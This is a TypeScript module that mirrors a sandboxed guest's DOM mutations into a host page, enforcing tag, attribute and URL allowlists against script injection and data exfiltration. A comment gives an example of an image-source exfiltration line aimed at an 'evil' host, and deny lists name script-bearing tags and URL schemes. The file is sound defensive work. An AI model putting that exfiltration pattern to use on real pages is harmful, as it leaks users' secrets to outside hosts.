/**
 * Remote DOM Host — applies guest DOM mutation records to a real DOM container.
 *
 * Security model — allowlist enforcement:
 *   - ALLOWED_TAGS: a fixed set of safe HTML elements. Any element not in this list
 *     is REJECTED and the mutation is silently dropped. `script`, `iframe`, `object`,
 *     `embed`, `link`, `meta`, `style`, `form`, `input`, `button`, `select`,
 *     `textarea`, and HTML event handler attributes are denied.
 *   - ALLOWED_ATTRIBUTES: a per-tag (plus global) set of safe attribute names.
 *     Attribute names that start with "on" (event handlers as strings), "data-"
 *     prefixed names that carry executable content, `href`/`src` with `javascript:`
 *     scheme, and non-listed names are all blocked.
 *   - Text content is always safe — it is set as a text node or via textContent
 *     (never innerHTML), so it cannot inject markup.
 *
 * Event forwarding:
 *   User events (click, input) on mirrored real DOM elements are forwarded back to
 *   the guest via a registered callback `onGuestEvent`. The kernel can wire this to
 *   a kernel event delivered to the guest process (e.g. via a `dom/event` kernel
 *   event). Each forwarded event carries the target element's node id (the virtual
 *   DOM id), the event type, and a payload (e.g. { value } for input events).
 */

import type { DomMutation } from '@mithic/guest-runtime/remote-dom';

// ---------------------------------------------------------------------------
// Allowlists
// ---------------------------------------------------------------------------

/**
 * Safe structural/content HTML tags. Interactive tags that can submit forms or
 * execute scripts are excluded. The host owns what can be rendered.
 */
export const ALLOWED_TAGS = new Set([
  'div', 'span', 'p', 'section', 'article', 'aside', 'header', 'footer',
  'main', 'nav', 'h1', 'h2', 'h3', 'h4', 'h5', 'h6',
  'ul', 'ol', 'li', 'dl', 'dt', 'dd',
  'table', 'thead', 'tbody', 'tfoot', 'tr', 'th', 'td', 'caption', 'colgroup', 'col',
  'a', 'abbr', 'b', 'bdi', 'bdo', 'br', 'cite', 'code', 'data', 'dfn',
  'em', 'i', 'kbd', 'mark', 'q', 's', 'samp', 'small', 'strong', 'sub', 'sup',
  'time', 'u', 'var', 'wbr',
  'blockquote', 'pre', 'hr',
  'figure', 'figcaption',
  'details', 'summary',
  'img',
  'audio', 'video', 'track', 'source',
  'canvas',
  'progress', 'meter',
  'label', 'output', 'fieldset', 'legend',
]);

/**
 * Global attributes allowed on all elements.
 * Excludes all `on*` handlers, `style` (could be used for expression injection
 * in older browsers), and `is` (custom elements bypass tag checks).
 */
export const ALLOWED_GLOBAL_ATTRIBUTES = new Set([
  'id', 'class', 'lang', 'dir', 'title', 'tabindex', 'hidden', 'accesskey',
  'contenteditable', 'draggable', 'spellcheck', 'translate',
  'aria-label', 'aria-labelledby', 'aria-describedby', 'aria-hidden',
  'aria-expanded', 'aria-checked', 'aria-disabled', 'aria-selected',
  'aria-controls', 'aria-live', 'aria-atomic', 'aria-relevant',
  'aria-owns', 'aria-flowto', 'aria-haspopup', 'aria-level',
  'aria-multiline', 'aria-multiselectable', 'aria-orientation',
  'aria-pressed', 'aria-readonly', 'aria-required', 'aria-sort',
  'aria-valuemax', 'aria-valuemin', 'aria-valuenow', 'aria-valuetext',
  'role',
  'slot', 'part',
  'data-id', 'data-value', 'data-label', 'data-index', 'data-key', 'data-type',
]);

/** Per-tag extra allowed attributes (extends global list). */
const ALLOWED_PER_TAG_ATTRIBUTES: Record<string, ReadonlySet<string>> = {
  a: new Set(['href', 'target', 'rel', 'download']),
  img: new Set(['src', 'alt', 'width', 'height', 'loading', 'decoding', 'srcset', 'sizes']),
  audio: new Set(['src', 'controls', 'autoplay', 'loop', 'muted', 'preload']),
  video: new Set(['src', 'controls', 'autoplay', 'loop', 'muted', 'preload', 'poster', 'width', 'height']),
  track: new Set(['src', 'kind', 'label', 'srclang', 'default']),
  source: new Set(['src', 'srcset', 'type', 'media', 'sizes']),
  canvas: new Set(['width', 'height']),
  progress: new Set(['value', 'max']),
  meter: new Set(['value', 'min', 'max', 'low', 'high', 'optimum']),
  time: new Set(['datetime']),
  col: new Set(['span']),
  colgroup: new Set(['span']),
  td: new Set(['colspan', 'rowspan', 'headers', 'scope']),
  th: new Set(['colspan', 'rowspan', 'headers', 'scope', 'abbr']),
  details: new Set(['open']),
  label: new Set(['for']),
  output: new Set(['for', 'form', 'name']),
  fieldset: new Set(['disabled', 'form', 'name']),
};

/**
 * §9 rule 3: URL-bearing attributes whose VALUE must be validated as LOCAL before it
 * reaches the host DOM. `src`/`poster`/`srcset` are PASSIVE asset contexts (an inert
 * `data:` image is allowed); `href`/`action`/`formaction`/`xlink:href` are navigational
 * and never take `data:`. Any attribute here pointed at a remote origin is a host-origin
 * GET-exfil channel (the host page has no CSP), so it is rejected.
 */
const URL_VALUE_ATTRIBUTES = new Set([
  'src', 'poster', 'srcset', 'href', 'action', 'formaction', 'xlink:href',
]);

/** Subset of {@link URL_VALUE_ATTRIBUTES} that are PASSIVE image/media contexts (inert data: OK). */
const PASSIVE_URL_ATTRIBUTES = new Set(['src', 'poster', 'srcset']);

/**
 * An INERT-image `data:` URL: a raster image type that cannot execute script. SVG is
 * DELIBERATELY excluded (`data:image/svg+xml` can carry `<script>`/`onload=`), as is any
 * non-image/data: — matching the iframe CSP's img-src data: allowance for passive assets.
 */
const INERT_IMAGE_DATA_RE = /^data:image\/(png|jpeg|jpg|gif|webp|bmp|avif|x-icon|vnd\.microsoft\.icon)[;,]/i;

// ---------------------------------------------------------------------------
// Forwarded guest event shape
// ---------------------------------------------------------------------------

export interface GuestDomEvent {
  /** Virtual DOM node id of the target element. */
  nodeId: number;
  /** Event type (e.g. "click", "input"). */
  eventType: string;
  /** Event-specific payload. For "input" events: { value: string }. */
  payload: Record<string, unknown>;
}

// ---------------------------------------------------------------------------
// RemoteDomHost
// ---------------------------------------------------------------------------

/**
 * Callback invoked when a user event on a mirrored DOM element should be
 * forwarded back to the guest. The kernel wires this to a `dom/event` kernel
 * event delivered to the appropriate guest process.
 */
export type GuestEventCallback = (event: GuestDomEvent) => void;

export interface RemoteDomHostOptions {
  /** The real DOM element that acts as the root container. */
  container: Element;
  /** Called when a forwarded user event needs to reach the guest. */
  onGuestEvent?: GuestEventCallback;
}

/**
 * Applies serialized DOM mutation records from a guest to a real DOM container,
 * enforcing an allowlist of tags and attributes for security.
 *
 * Security guarantee: a guest CANNOT inject `<script>`, `<iframe>`, event
 * handlers, or arbitrary HTML into the host page — only elements/attributes on
 * the allowlist reach the real DOM.
 */
export class RemoteDomHost {
  #container: Element;
  #onGuestEvent: GuestEventCallback | undefined;
  /** Virtual node id → real DOM node. */
  #nodes = new Map<number, Node>();
  /** Real DOM node → virtual node id (for event forwarding). */
  #nodeIds = new WeakMap<Node, number>();
  /** Cleanup callbacks for forwarded event listeners (nodeId → [type, handler][]). */
  #listeners = new Map<number, Array<[string, EventListener]>>();

  constructor(options: RemoteDomHostOptions) {
    this.#container = options.container;
    this.#onGuestEvent = options.onGuestEvent;
    // Register the container itself as node 0 (the implicit root parent).
    this.#nodes.set(0, this.#container);
    this.#nodeIds.set(this.#container, 0);
  }

  /**
   * Apply a batch of mutation records. Records that fail allowlist checks are
   * silently dropped (logged via console.warn in debug builds). Returns the
   * number of mutations actually applied.
   */
  applyMutations(mutations: DomMutation[]): number {
    let applied = 0;
    for (const m of mutations) {
      if (this.#apply(m)) applied++;
    }
    return applied;
  }

  /** Tear down: remove all forwarded event listeners and clear node map. */
  dispose(): void {
    for (const [id, handlers] of this.#listeners) {
      const node = this.#nodes.get(id);
      if (node instanceof EventTarget) {
        for (const [type, handler] of handlers) {
          node.removeEventListener(type, handler);
        }
      }
    }
    this.#listeners.clear();
    this.#nodes.clear();
    this.#nodes.set(0, this.#container);
    this.#nodeIds = new WeakMap();
    this.#nodeIds.set(this.#container, 0);
  }

  /**
   * Number of registered nodes (including the container, id 0). Exposed for
   * tests asserting that removed nodes are dropped from the registry rather than
   * leaked. After a create→append→remove cycle this returns to its pre-create
   * value.
   */
  get nodeCount(): number {
    return this.#nodes.size;
  }

  // ---------------------------------------------------------------------------
  // Private helpers
  // ---------------------------------------------------------------------------

  #apply(m: DomMutation): boolean {
    switch (m.type) {
      case 'createElement':
        return this.#createElement(m.id, m.tag);
      case 'createText':
        return this.#createText(m.id, m.text);
      case 'appendChild':
        return this.#appendChild(m.parentId, m.childId);
      case 'removeChild':
        return this.#removeChild(m.parentId, m.childId);
      case 'setAttribute':
        return this.#setAttribute(m.id, m.name, m.value);
      case 'removeAttribute':
        return this.#removeAttribute(m.id, m.name);
      case 'setTextContent':
        return this.#setTextContent(m.id, m.text);
      default:
        return false;
    }
  }

  #createElement(id: number, tag: string): boolean {
    const normalTag = tag.toLowerCase();
    if (!ALLOWED_TAGS.has(normalTag)) {
      // Reject — tag not on allowlist (e.g. script, iframe, object)
      return false;
    }
    const el = document.createElement(normalTag);
    this.#nodes.set(id, el);
    this.#nodeIds.set(el, id);
    // Wire click event forwarding.
    this.#wireEvents(id, el);
    return true;
  }

  #createText(id: number, text: string): boolean {
    const node = document.createTextNode(text);
    this.#nodes.set(id, node);
    // Track the reverse mapping too so #forget can drop text descendants when
    // their ancestor is removed (otherwise text-node ids would leak).
    this.#nodeIds.set(node, id);
    return true;
  }

  #appendChild(parentId: number, childId: number): boolean {
    const parent = this.#nodes.get(parentId);
    const child = this.#nodes.get(childId);
    if (!parent || !child) return false;
    parent.appendChild(child);
    return true;
  }

  #removeChild(parentId: number, childId: number): boolean {
    const parent = this.#nodes.get(parentId);
    const child = this.#nodes.get(childId);
    if (!parent || !child) return false;
    try {
      parent.removeChild(child);
    } catch {
      return false;
    }
    // Drop the removed subtree from the registry so the maps don't grow without
    // bound under create→append→remove cycles. The child id and every tracked
    // descendant id are forgotten (along with their forwarded event listeners).
    this.#forget(childId, child);
    return true;
  }

  /**
   * Remove `node` (and any tracked descendants) from `#nodes`/`#nodeIds` and
   * tear down their forwarded event listeners. Called when a node is removed
   * from the tree so the host registry doesn't leak ids that can never recur.
   */
  #forget(id: number, node: Node): void {
    // Tear down listeners for this id, if any.
    const handlers = this.#listeners.get(id);
    if (handlers && node instanceof EventTarget) {
      for (const [type, handler] of handlers) node.removeEventListener(type, handler);
    }
    this.#listeners.delete(id);
    this.#nodes.delete(id);
    this.#nodeIds.delete(node);
    // Recurse into tracked children: a descendant is tracked iff it has a node id.
    for (const childNode of Array.from(node.childNodes)) {
      const childId = this.#nodeIds.get(childNode);
      if (childId !== undefined) this.#forget(childId, childNode);
    }
  }

  #setAttribute(id: number, name: string, value: string): boolean {
    // The container (node 0) is the HOST's element — a guest must not mutate its
    // attributes (could wipe host classes/ids or smuggle in styling/handlers).
    if (id === 0) return false;
    const node = this.#nodes.get(id);
    if (!(node instanceof Element)) return false;
    const tag = node.tagName.toLowerCase();
    if (!this.#isAttributeAllowed(tag, name, value)) return false;
    node.setAttribute(name, value);
    return true;
  }

  #removeAttribute(id: number, name: string): boolean {
    // Guard the host container (node 0) — see #setAttribute.
    if (id === 0) return false;
    const node = this.#nodes.get(id);
    if (!(node instanceof Element)) return false;
    const tag = node.tagName.toLowerCase();
    if (!this.#isAttributeAllowed(tag, name, '')) return false;
    node.removeAttribute(name);
    return true;
  }

  #setTextContent(id: number, text: string): boolean {
    // Guard the host container (node 0): a guest setting textContent on id 0
    // would wipe the host element's children/text.
    if (id === 0) return false;
    const node = this.#nodes.get(id);
    if (!node) return false;
    node.textContent = text;
    return true;
  }

  /**
   * Attribute allowlist check.
   * Blocks:
   *   1. Any attribute starting with "on" (event handler as string).
   *   2. URL-bearing attributes (`href`/`src`/`poster`/`srcset`/`action`/`formaction`/
   *      `xlink:href`) whose VALUE is not LOCAL — see {@link #isUrlValueAllowed} (§9 rule 3).
   *   3. Any attribute not in the global or per-tag allowlist.
   */
  #isAttributeAllowed(tag: string, name: string, value: string): boolean {
    const lname = name.toLowerCase();
    // Block all on* event handlers (e.g. onclick, onmouseover, onerror)
    if (lname.startsWith('on')) return false;
    // §9 rule 3: RemoteDomHost renders in the HOST page, OUTSIDE any iframe CSP (the
    // Lab drives it over a host-page container with no page CSP). A URL-bearing
    // attribute pointed at a REMOTE origin is a covert host-origin GET the guest
    // controls (`img.src='https://evil/?'+secret`) — an exfil channel connect-src
    // 'none' inside the iframe cannot stop. So URL VALUES, not only element/attr
    // TYPES, are validated: only LOCAL values (blob:, inert data: for passive assets,
    // same-origin/relative) reach the DOM; anything remote / unparseable is REJECTED.
    if (URL_VALUE_ATTRIBUTES.has(lname)) {
      const passive = PASSIVE_URL_ATTRIBUTES.has(lname);
      if (lname === 'srcset') {
        if (!this.#isSrcsetAllowed(value)) return false;
      } else if (!this.#isUrlValueAllowed(value, passive)) {
        return false;
      }
    }
    if (ALLOWED_GLOBAL_ATTRIBUTES.has(lname)) return true;
    const perTag = ALLOWED_PER_TAG_ATTRIBUTES[tag];
    if (perTag?.has(lname)) return true;
    return false;
  }

  /**
   * §9 rule 3 URL-value validator (fail closed). A URL is LOCAL (allowed) iff it is:
   *   - a `blob:` URL (a guest-produced local object — first-party apps render these),
   *   - for a PASSIVE asset attr (img/media `src`/`poster`), an INERT-image `data:` URL
   *     (`data:image/{png,jpeg,gif,webp,bmp,avif};…`) — NOT `data:image/svg+xml` (SVG can
   *     script) and NOT any non-image/data: (matches §5's img-src data: allowance), OR
   *   - a same-origin / relative URL: no scheme (`local.png`, `./a`, `?q`, `#f`) or a
   *     root-relative path `/x` — but NOT a protocol-relative `//host` (that is remote).
   * Everything else — `http:`, `https:`, `ws(s):`, `ftp:`, `//host`, `javascript:`,
   * `vbscript:`, non-inert `data:`, or an unparseable value — is REMOTE/unsafe → REJECTED.
   */
  #isUrlValueAllowed(raw: string, passive: boolean): boolean {
    const value = raw.trim();
    if (value === '') return true; // empty attr is inert
    // Protocol-relative `//host…` is REMOTE (inherits the host page's scheme).
    if (value.startsWith('//')) return false;
    // A leading scheme (`foo:`) — classify it. No scheme → relative/same-origin (allowed).
    const scheme = /^([a-z][a-z0-9+.-]*):/i.exec(value)?.[1]?.toLowerCase();
    if (!scheme) return true; // relative path / query / fragment — same-origin, local
    if (scheme === 'blob') return true;
    if (scheme === 'data') return passive && INERT_IMAGE_DATA_RE.test(value);
    // http/https/ws/wss/ftp/javascript/vbscript/file/… — remote or unsafe → reject.
    return false;
  }

  /**
   * §9 rule 3 for `srcset`: a comma-separated list of `url [descriptor]` candidates.
   * EVERY candidate URL must be LOCAL (see {@link #isUrlValueAllowed}); one remote
   * candidate poisons the whole attribute (fail closed). srcset is always a passive
   * image context, so the inert-data: allowance applies.
   */
  #isSrcsetAllowed(value: string): boolean {
    const candidates = value.split(',').map((c) => c.trim()).filter((c) => c !== '');
    if (candidates.length === 0) return true;
    for (const candidate of candidates) {
      // The URL is the first whitespace-delimited token; the rest is a descriptor.
      const url = candidate.split(/\s+/, 1)[0];
      if (!this.#isUrlValueAllowed(url, true)) return false;
    }
    return true;
  }

  /**
   * Wire click event forwarding. Every allowlisted element can be clicked, so a
   * single click listener is attached and forwarded to the guest. Input-like
   * elements (input/textarea/select) are NOT in ALLOWED_TAGS, so there is no
   * `input` event to forward.
   */
  #wireEvents(id: number, el: HTMLElement): void {
    if (!this.#onGuestEvent) return;
    const handler: EventListener = (e) => {
      // Only forward if this element is the target (not a bubble from a child
      // that has its own id — the child's listener handles that case).
      if (e.target !== el) return;
      this.#onGuestEvent?.({ nodeId: id, eventType: 'click', payload: {} });
    };
    el.addEventListener('click', handler);
    this.#listeners.set(id, [['click', handler]]);
  }
}
